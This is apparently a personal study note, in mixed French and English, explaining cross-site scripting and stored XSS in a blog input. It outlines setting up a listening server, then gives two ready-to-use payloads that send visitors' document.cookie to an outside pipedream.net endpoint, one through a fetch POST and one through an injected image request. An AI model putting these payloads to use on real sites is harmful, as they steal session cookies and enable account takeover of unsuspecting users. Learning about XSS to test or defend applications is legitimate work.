Les faille xss sont des faille généralement de Javascript, qui apparaissent lorsque qu'un input user est utiliser directement sur le code html sans correction OU quand il y a une url avec un parametre non protéger.

un exemple simple serait d'utiliser un script simple : `<script>alert(hello)</script>` dans un chat mal sécuriser

## XSS STORED
There is two type of xss flaws , and one of these is the stored xss flaws.

Stored xxs flows occur when the input of the user is directly stored in the db which means when someone else will interact with the db it will execute the code on his web client.

For exemple : 
Imagine a blog where u have an input which will store your exact input in the db then display the input in html code.

What you can do is for exemple : 
- create a server / domain name / url which will listen on http request.
- put a script in the db via the input
- get the data from your script on your servers request
---


Here are some example of xxs script for getting cookies :
	To send a post request with the cookie in the body : 
	`<script> fetch('https://eolyqf07jmav0tu.m.pipedream.net', {method: 'POST', mode: 'no-cors', body:document.cookie });</script>`
	To send a get request via an image :
	`<script>document.write('<img src="https://eolyqf07jmav0tu.m.pipedream.net/?c='+document.cookie+'" />');</script>
`